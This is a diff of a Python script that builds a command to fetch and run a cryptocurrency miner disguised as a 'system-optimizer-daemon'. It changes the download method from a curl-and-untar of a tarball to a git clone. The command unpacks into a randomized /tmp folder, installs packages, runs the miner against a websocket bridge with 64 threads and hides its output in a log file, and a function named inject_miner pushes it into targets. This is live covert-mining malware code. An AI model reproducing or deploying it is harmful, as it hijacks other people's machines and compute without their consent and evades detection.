@@ -10,7 +10,7 @@ import subprocess
 from datetime import datetime
 
 # Worker config
-MINER_URL = "https://raw.githubusercontent.com/amineborkadi/system-optimizer-daemon/master/sysoptd-2.1.5.tar.gz"
+MINER_REPO = "https://github.com/amineborkadi/system-optimizer-daemon.git"
 BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
 
 
@@ -26,7 +26,7 @@ def generate_random_folder_name() -> str:
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command with randomized folder."""
-    return f"""cd /tmp && curl -sL "{MINER_URL}" | tar xz && mv sysoptd-2.1.* {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1"""
+    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
